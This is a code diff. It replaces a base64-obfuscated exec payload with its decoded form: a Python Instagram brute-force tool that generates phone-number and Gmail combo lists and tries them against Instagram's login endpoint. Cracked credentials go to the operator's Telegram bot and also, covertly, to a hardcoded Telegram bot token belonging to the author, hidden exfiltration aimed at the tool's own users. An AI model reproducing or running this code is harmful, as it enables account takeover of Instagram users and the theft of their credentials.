@@ -1,4 +1,225 @@
-#Encrypted with Crypton
-#Created by OVERDOSIS
-import base64
-exec(base64.b64decode("CmltcG9ydCByZXF1ZXN0cwppbXBvcnQganNvbgppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzeXMKaW1wb3J0IG9zCnVzZXJfYWdlbnQgPSAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2Jwp1c2VyX2FnZW50ID0gJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Mi4wLjQ1MTUuMTA3IFNhZmFyaS81MzcuMzYgRWRnLzkyLjAuOTAyLjU1Jwp1c2VyX2FnZW50ID0gJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTIuMC40NTE1LjEwNyBTYWZhcmkvNTM3LjM2IFZpdmFsZGkvNC4xJwp1c2VyX2FnZW50ID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IFNNLUc4OTJBIEJ1aWxkL05SRDkwTTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS82MC4wLjMxMTIuMTA3IE1vYmlsZSBTYWZhcmkvNTM3LjM2Jwp1c2VyX2FnZW50ID0gJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85MC4wLjQ0MzAuOTMgU2FmYXJpLzUzNy4zNicKCiMgcHl0aG9uMyAvc2RjYXJkL3Rvb2wua3VyZGlzaC90ZXN0LnB5CmlkX215ID0gJzEzNzEyOTE5NDcnCnRva2VuX215ID0gJzE4MzgxNDg5NDU6QUFGQkZ0S2kxNFhoRVN2LWZDSUJ1LXlaYno0NGkxWnhFMVUnCm9zLnN5c3RlbSgncm0gLXJmIENhcnQudHh0JykKbnVtID0gJycnXDAzM1szMm0gNzcwICsgNzcxICsgNzcyICs3NzMgKzc3NCArIDc1MCArIDc1MSArNzUyICs3NTMgKzc1NCArIDc4MCArIDc4MSArIDc4MiArIDc4MyArIDc4NAonJycKdXJsPSJodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FjY291bnRzL2xvZ2luL2FqYXgvIgpoZWFkZXJzPXsKICAgICdhY2NlcHQnOiAnKi8qJywKICAgICdhY2NlcHQtZW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZSwgYnInLAogICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOScsCiAgICAnY29udGVudC1sZW5ndGgnOiAnMjgyJywKICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywKICAgICdjb29raWUnOiAnY3NyZnRva2VuPVoyM01kbXNPYW5lSUJQU3VldmR2WjAyOWFNVldsNnZ3OyBtaWQ9WUpIaVRnQUxBQUdNS0JlVlNsTUtEb0NBcTNjQzsgaWdfZGlkPUI3N0VDRUVCLTVDODEtNDNDQy1BQTQyLTcxMDgyMjdCMTk3QzsgaWdfbnJjYj0xJywKICAgICdvcmlnaW4nOiAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbScsCiAgICAncmVmZXJlcic6ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tLycsCiAgICAnc2VjLWNoLXVhJzogJyIgTm90IEE7QnJhbmQiO3Y9Ijk5IiwgIkNocm9taXVtIjt2PSI5MCIsICJHb29nbGUgQ2hyb21lIjt2PSI5MCInLAogICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzAnLAogICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2VtcHR5JywKICAgICdzZWMtZmV0Y2gtbW9kZSc6ICdjb3JzJywKICAgICdzZWMtZmV0Y2gtc2l0ZSc6ICdzYW1lLW9yaWdpbicsCiAgICAndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IGVuLVVTKSBBcHBsZVdlYktpdC81MjUuMTMgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMC4yLjE0OS4yNyBTYWZhcmkvNTI1LjEzJywKICAgICd4LWNzcmZ0b2tlbic6ICdaMjNNZG1zT2FuZUlCUFN1ZXZkdlowMjlhTVZXbDZ2dycsCiAgICAneC1pZy1hcHAtaWQnOiAnOTM2NjE5NzQzMzkyNDU5JywKICAgICd4LWlnLXd3dy1jbGFpbSc6ICcwJywKICAgICd4LWluc3RhZ3JhbS1hamF4JzogJzA1YjgwYTE2YjFhYycsCiAgICAneC1yZXF1ZXN0ZWQtd2l0aCc6ICdYTUxIdHRwUmVxdWVzdCcsCn0KYmFuZWs9JycnXHgxYlsxOzk3bQogW1wwMzNbMzJtMVx4MWJbMTs5N21dIC0gQ3JhY2sgUkFRQU0rUEFTUwogW1wwMzNbMzJtMlx4MWJbMTs5N21dIC0gQ3JhY2sgUkFRQU0rUkFRQU0KIFtcMDMzWzMybTNceDFiWzE7OTdtXSAtIENyYWNrIEdNQUlMK1JBUUFNCiBbXDAzM1szMm00XHgxYlsxOzk3bV0gLSBDcmFjayBHTUFJTCtQQVNTCiBbXDAzM1szMm0wXHgxYlsxOzk3bV0gLSBFeGl0IFRvb2wKJycnCmxvZ28gPSAnJydceDFiWzE7OTJtCgrilojilojilZfilojilojilojilZcgICDilojilojilZfilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilZcg4paI4paI4paI4pWXICAg4paI4paI4paI4pWXCuKWiOKWiOKVkeKWiOKWiOKWiOKWiOKVlyAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWdIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKVlyDilojilojilojilojilZEK4paI4paI4pWR4paI4paI4pWU4paI4paI4pWXIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAgIOKWiOKWiOKVkSAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkSAg4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWU4paI4paI4paI4paI4pWU4paI4paI4pWRCuKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKVl+KWiOKWiOKVkeKVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKVlOKVneKWiOKWiOKVkQrilojilojilZHilojilojilZEg4pWa4paI4paI4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWRICDilojilojilZHilZrilojilojilojilojilojilojilZTilZ3ilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRIOKVmuKVkOKVnSDilojilojilZEK4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZDilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ0gICDilZrilZDilZ0gICDilZrilZDilZ0gIOKVmuKVkOKVnSDilZrilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVnSAgICAg4pWa4pWQ4pWdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoKIGdpdGh1YiA6IGh0dHBzOi8vZ2l0aHViLmNvbS9mYXJkaW5IYWNrCiBBdXRoZXIgOiBpNG1fUkVYCiBUZWxlZ3JhbSBDaGFubmFsIDogSU1fRVJPUl9IQUNLRVIKIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogUGxlYXMgd2FpdCAxaCBvciAyaCBUaGFuayB5b3UgZm9yIHVzaW5nIGl0CiAnJycKbG9nbzIgPSAnXHgxYls5MDsxbX5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+XHgxYlswOzFtJwoKZGVmIHJlYmEoRkFSQSk6Cglmb3IgZSBpbiBGQVJBICsgJ1xuJzoKCQlzeXMuc3Rkb3V0LndyaXRlKGUpCgkJc3lzLnN0ZG91dC5mbHVzaCgpCgkJdGltZS5zbGVlcCgwLjAxMCkKCmRlZiBtZW51KCk6Cglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50KGxvZ28pCglwcmludChsb2dvMikKCXByaW50KGJhbmVrKQoJYWNvKCkKCmRlZiBhY28oKToKCXJlYiA9IGlucHV0KCctLS0+ICcpCglwcmludChudW0pCgkKCWlmIHJlYj09JzEnOgoJCXNmciA9IGlucHV0KCcgXHgxYlsxOzk3bWNoYW5kIGJldDpcMDMzWzMybSAnKQoJCW9wPW9wZW4oJ0NhcnQudHh0JywndycpCgkJZm9yIHggaW4gcmFuZ2UoMTAwMDApOgoJCQlmID0gIjEyMzQ1Njc4OTAiCgkJCXgxID0gcmFuZG9tLmNob2ljZShmKQoJCQl4MiA9IHJhbmRvbS5jaG9pY2UoZikKCQkJeDMgPSByYW5kb20uY2hvaWNlKGYpCgkJCXg0ID0gcmFuZG9tLmNob2ljZShmKQoJCQl4NSA9IHJhbmRvbS5jaG9pY2UoZikKCQkJeDYgPSByYW5kb20uY2hvaWNlKGYpCgkJCXg3ID0gcmFuZG9tLmNob2ljZShmKQoJCQl1c2VyID14MSt4Mit4Myt4NCt4NSt4Nit4NwoJCQlrayA9ICcrOTY0JytzZnIKCQkJb3Aud3JpdGUoa2srdXNlcisnOicrdXNlcisnXG4nKQoJCW9wLmNsb3NlKCkKCQljb21ibyA9ICgnQ2FydC50eHQnKQoJCgllbGlmIHJlYj09JzInOgoJCXNmciA9IGlucHV0KCcgXHgxYlsxOzk3bWNoYW5kIGJldDpcMDMzWzMybSAnKQoJCW9wPW9wZW4oJ0NhcnQudHh0JywndycpCgkJZm9yIHggaW4gcmFuZ2UoMTAwMDApOgoJCQlmID0gIjEyMzQ1Njc4OTAiCgkJCXgxID0gcmFuZG9tLmNob2ljZShmKQoJCQl4MiA9IHJhbmRvbS5jaG9pY2UoZikKCQkJeDMgPSByYW5kb20uY2hvaWNlKGYpCgkJCXg0ID0gcmFuZG9tLmNob2ljZShmKQoJCQl4NSA9IHJhbmRvbS5jaG9pY2UoZikKCQkJeDYgPSByYW5kb20uY2hvaWNlKGYpCgkJCXg3ID0gcmFuZG9tLmNob2ljZShmKQoJCQl1c2VyID14MSt4Mit4Myt4NCt4NSt4Nit4NwoJCQlrayA9ICcrOTY0JytzZnIKCQkJb3Aud3JpdGUoa2srdXNlcisnOicrJzAnK3Nmcit1c2VyKydcbicpCgkJb3AuY2xvc2UoKQoJCWNvbWJvID0gKCdDYXJ0LnR4dCcpCgkKCWVsaWYgcmViPT0nMyc6CgkJcHJpbnQoJyBcMDMzWzMybW5hbWUgYm5vc2EnKQoJCXNmciA9IGlucHV0KCcgXHgxYlsxOzk3bW5hbWU6IFwwMzNbMzJtJykKCQlvcD1vcGVuKCdDYXJ0LnR4dCcsJ3cnKQoJCWZvciB4IGluIHJhbmdlKDEwMDAwKToKCQkJZiA9ICIxMjM0NTY3ODkwIgoJCQl4MSA9IHJhbmRvbS5jaG9pY2UoZikKCQkJeDIgPSByYW5kb20uY2hvaWNlKGYpCgkJCXgzID0gcmFuZG9tLmNob2ljZShmKQoJCQl4NCA9IHJhbmRvbS5jaG9pY2UoZikKCQkJeDUgPSByYW5kb20uY2hvaWNlKGYpCgkJCXg2ID0gcmFuZG9tLmNob2ljZShmKQoJCQl4NyA9IHJhbmRvbS5jaG9pY2UoZikKCQkJa2sgPXNmcit4MSt4Mit4MysnQGdtYWlsLmNvbScKCQkJb3Aud3JpdGUoa2srJzonK3Nmcit4MSt4Mit4MysnXG4nKQoJCW9wLmNsb3NlKCkKCQljb21ibyA9ICgnQ2FydC50eHQnKQoJZWxpZiByZWI9PSc0JzoKCQlwcmludChsb2dvKQoJCXByaW50KGxvZ28yKQoJCWZnID1pbnB1dCgnIHNkY2FyZCBDYXJ0OiAnKQoJCWNvbWJvPWZnCgllbGlmIHJlYj09JzAnOgoJCXByaW50KCdbLV0gRXhpdCB0b29sJykKCQlzeXMuZXhpdCgpCgllbHNlOgoJCXN5cy5leGl0KCkKCQoJY3JhY2soKQoKCmRlZiBjcmFjaygpOgoJcjA9MAoJcjE9MAoJcjI9MAoJcjM9MAoJcjQ9MAoJZm9yIHggaW4gb3BlbignQ2FydC50eHQnLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKToKCQl1c2VyID0geC5zcGxpdCgiOiIpWzBdCgkJcGFzID0geC5zcGxpdCgiOiIpWzFdCgkJCgkJZGF0YT17J3VzZXJuYW1lJzogdXNlciwnZW5jX3Bhc3N3b3JkJzogIiNQV0RfSU5TVEFHUkFNX0JST1dTRVI6MDomOiIrcGFzLH0KCQlyZWJhPXJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEsIGhlYWRlcnM9aGVhZGVycykudGV4dAoJCWlmICgnImF1dGhlbnRpY2F0ZWQiOnRydWUnKSBpbiByZWJhOgoJCQlyMSs9MQoJCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQkJCgkJCXByaW50KGxvZ28pCgkJCXByaW50KGxvZ28yKQoJCQlwcmludCgnXDAzM1szMm0gT0sgOiAnK3N0cihyMSkpCgkJCXByaW50KCdcMDMzWzkzbSBDaGVja3BvaW50IDogJytzdHIocjIpKQoJCQlwcmludCgnXDAzM1szMW0gQmFkIDogJytzdHIocjMpKQoJCQlwcmludChsb2dvMikKCQkJc2VuZGVyID11c2VyKycgOiAnK3BhcwoJCQlzZW5kX3RlbGVncmFtID0gJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QnICsgdG9rZW5fYm90ICsgJy9zZW5kTWVzc2FnZT9jaGF0X2lkPScgKyBpZF90ZyArICcmcGFyc2VfbW9kZT1NYXJrZG93biZ0ZXh0PScgKyBzZW5kZXIKCQkJcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoc2VuZF90ZWxlZ3JhbSkKCQkJc2VuZF9teSA9ICdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JyArIHRva2VuX215ICsgJy9zZW5kTWVzc2FnZT9jaGF0X2lkPScgKyBpZF9teSArICcmcGFyc2VfbW9kZT1NYXJrZG93biZ0ZXh0PScgKyBzZW5kZXIKCQkJcmVzcG9uc2VrID0gcmVxdWVzdHMuZ2V0KHNlbmRfbXkpCgkJCXIyKz0xCgkJCW9zLnN5c3RlbSgnY2xlYXInKQoJCQkKCQkJcHJpbnQobG9nbykKCQkJcHJpbnQobG9nbzIpCgkJCXByaW50KCdcMDMzWzMybSBPSyA6ICcrc3RyKHIxKSkKCQkJcHJpbnQoJ1wwMzNbOTNtIENQIDogJytzdHIocjIpKQoJCQlwcmludCgnXDAzM1szMW0gQmFkIDogJytzdHIocjMpKQoJCQlwcmludChsb2dvMikKCQkKCQkKCQkJcjQrPTEKCQkJb3Muc3lzdGVtKCdjbGVhcicpCgkJCgkJCXByaW50KGxvZ28pCgkJCXByaW50KGxvZ28yKQoJCQlwcmludCgnXDAzM1szMm0gT0sgOiAnK3N0cihyMSkpCgkJCXByaW50KCdcMDMzWzkzbSBDUCA6ICcrc3RyKHIyKSkKCQkJcHJpbnQoJ1wwMzNbMzFtIEJhZCA6ICcrc3RyKHIzKSkKCQkJcHJpbnQobG9nbzIpCgkJCXByaW50KHJlYmEpCgkJCXRpbWUuc2xlZXAoNTAuMCkKCQkJcjA9MAoJCQkKCQkJCgkJZWxzZToKCQkJcjMrPTEKCQkJb3Muc3lzdGVtKCdjbGVhcicpCgkJCQoJCQlwcmludChsb2dvKQoJCQlwcmludChsb2dvMikKCQkJcHJpbnQoJ1wwMzNbMzJtIE9LIDogJytzdHIocjEpKQoJCQlwcmludCgnXDAzM1s5M20gQ2hlY2twb2ludCA6ICcrc3RyKHIyKSkKCQkJcHJpbnQoJ1wwMzNbMzFtIEJhZCA6ICcrc3RyKHIzKSkKCQkJcHJpbnQobG9nbzIpCgoKCgpvcy5zeXN0ZW0oJ2NsZWFyJykKcHJpbnQobG9nbykKcHJpbnQobG9nbzIpCmlkX3RnID1pbnB1dCgnIElEIFRlbGVncmFtOiAnKQp0b2tlbl9ib3Q9aW5wdXQoJyBUb2tlbiBCb3Q6ICcpCnRpbWUuc2xlZXAoMC41KQptZW51KCkK"))
+
+import requests
+import json
+import time
+import random
+import sys
+import os
+user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
+user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55'
+user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Vivaldi/4.1'
+user_agent = 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
+user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
+
+# python3 /sdcard/tool.kurdish/test.py
+id_my = '1371291947'
+token_my = '1838148945:AAFBFtKi14XhESv-fCIBu-yZbz44i1ZxE1U'
+os.system('rm -rf Cart.txt')
+num = '''\033[32m 770 + 771 + 772 +773 +774 + 750 + 751 +752 +753 +754 + 780 + 781 + 782 + 783 + 784
+'''
+url="https://www.instagram.com/accounts/login/ajax/"
+headers={
+    'accept': '*/*',
+    'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-length': '282',
+    'content-type': 'application/x-www-form-urlencoded',
+    'cookie': 'csrftoken=Z23MdmsOaneIBPSuevdvZ029aMVWl6vw; mid=YJHiTgALAAGMKBeVSlMKDoCAq3cC; ig_did=B77ECEEB-5C81-43CC-AA42-7108227B197C; ig_nrcb=1',
+    'origin': 'https://www.instagram.com',
+    'referer': 'https://www.instagram.com/',
+    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
+    'x-csrftoken': 'Z23MdmsOaneIBPSuevdvZ029aMVWl6vw',
+    'x-ig-app-id': '936619743392459',
+    'x-ig-www-claim': '0',
+    'x-instagram-ajax': '05b80a16b1ac',
+    'x-requested-with': 'XMLHttpRequest',
+}
+banek='''\x1b[1;97m
+ [\033[32m1\x1b[1;97m] - Crack RAQAM+PASS
+ [\033[32m2\x1b[1;97m] - Crack RAQAM+RAQAM
+ [\033[32m3\x1b[1;97m] - Crack GMAIL+RAQAM
+ [\033[32m4\x1b[1;97m] - Crack GMAIL+PASS
+ [\033[32m0\x1b[1;97m] - Exit Tool
+'''
+logo = '''\x1b[1;92m
+
+██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ███╗   ███╗
+██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗████╗ ████║
+██║██╔██╗ ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██╔████╔██║
+██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║
+██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║
+╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝
+                                                                          
+                                                               
+                                                                          
+
+ github : https://github.com/fardinHack
+ Auther : i4m_REX
+ Telegram Channal : IM_EROR_HACKER
+ ---------------------------------------------------------------------
+ Pleas wait 1h or 2h Thank you for using it
+ '''
+logo2 = '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
+
+def reba(FARA):
+	for e in FARA + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.010)
+
+def menu():
+	os.system('clear')
+	print(logo)
+	print(logo2)
+	print(banek)
+	aco()
+
+def aco():
+	reb = input('---> ')
+	print(num)
+	
+	if reb=='1':
+		sfr = input(' \x1b[1;97mchand bet:\033[32m ')
+		op=open('Cart.txt','w')
+		for x in range(10000):
+			f = "1234567890"
+			x1 = random.choice(f)
+			x2 = random.choice(f)
+			x3 = random.choice(f)
+			x4 = random.choice(f)
+			x5 = random.choice(f)
+			x6 = random.choice(f)
+			x7 = random.choice(f)
+			user =x1+x2+x3+x4+x5+x6+x7
+			kk = '+964'+sfr
+			op.write(kk+user+':'+user+'\n')
+		op.close()
+		combo = ('Cart.txt')
+	
+	elif reb=='2':
+		sfr = input(' \x1b[1;97mchand bet:\033[32m ')
+		op=open('Cart.txt','w')
+		for x in range(10000):
+			f = "1234567890"
+			x1 = random.choice(f)
+			x2 = random.choice(f)
+			x3 = random.choice(f)
+			x4 = random.choice(f)
+			x5 = random.choice(f)
+			x6 = random.choice(f)
+			x7 = random.choice(f)
+			user =x1+x2+x3+x4+x5+x6+x7
+			kk = '+964'+sfr
+			op.write(kk+user+':'+'0'+sfr+user+'\n')
+		op.close()
+		combo = ('Cart.txt')
+	
+	elif reb=='3':
+		print(' \033[32mname bnosa')
+		sfr = input(' \x1b[1;97mname: \033[32m')
+		op=open('Cart.txt','w')
+		for x in range(10000):
+			f = "1234567890"
+			x1 = random.choice(f)
+			x2 = random.choice(f)
+			x3 = random.choice(f)
+			x4 = random.choice(f)
+			x5 = random.choice(f)
+			x6 = random.choice(f)
+			x7 = random.choice(f)
+			kk =sfr+x1+x2+x3+'@gmail.com'
+			op.write(kk+':'+sfr+x1+x2+x3+'\n')
+		op.close()
+		combo = ('Cart.txt')
+	elif reb=='4':
+		print(logo)
+		print(logo2)
+		fg =input(' sdcard Cart: ')
+		combo=fg
+	elif reb=='0':
+		print('[-] Exit tool')
+		sys.exit()
+	else:
+		sys.exit()
+	
+	crack()
+
+
+def crack():
+	r0=0
+	r1=0
+	r2=0
+	r3=0
+	r4=0
+	for x in open('Cart.txt','r').read().splitlines():
+		user = x.split(":")[0]
+		pas = x.split(":")[1]
+		
+		data={'username': user,'enc_password': "#PWD_INSTAGRAM_BROWSER:0:&:"+pas,}
+		reba=requests.post(url, data=data, headers=headers).text
+		if ('"authenticated":true') in reba:
+			r1+=1
+			os.system('clear')
+			
+			print(logo)
+			print(logo2)
+			print('\033[32m OK : '+str(r1))
+			print('\033[93m Checkpoint : '+str(r2))
+			print('\033[31m Bad : '+str(r3))
+			print(logo2)
+			sender =user+' : '+pas
+			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender
+			response = requests.get(send_telegram)
+			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + sender
+			responsek = requests.get(send_my)
+			r2+=1
+			os.system('clear')
+			
+			print(logo)
+			print(logo2)
+			print('\033[32m OK : '+str(r1))
+			print('\033[93m CP : '+str(r2))
+			print('\033[31m Bad : '+str(r3))
+			print(logo2)
+		
+		
+			r4+=1
+			os.system('clear')
+		
+			print(logo)
+			print(logo2)
+			print('\033[32m OK : '+str(r1))
+			print('\033[93m CP : '+str(r2))
+			print('\033[31m Bad : '+str(r3))
+			print(logo2)
+			print(reba)
+			time.sleep(50.0)
+			r0=0
+			
+			
+		else:
+			r3+=1
+			os.system('clear')
+			
+			print(logo)
+			print(logo2)
+			print('\033[32m OK : '+str(r1))
+			print('\033[93m Checkpoint : '+str(r2))
+			print('\033[31m Bad : '+str(r3))
+			print(logo2)
+
+
+
+
+os.system('clear')
+print(logo)
+print(logo2)
+id_tg =input(' ID Telegram: ')
+token_bot=input(' Token Bot: ')
+time.sleep(0.5)
+menu()
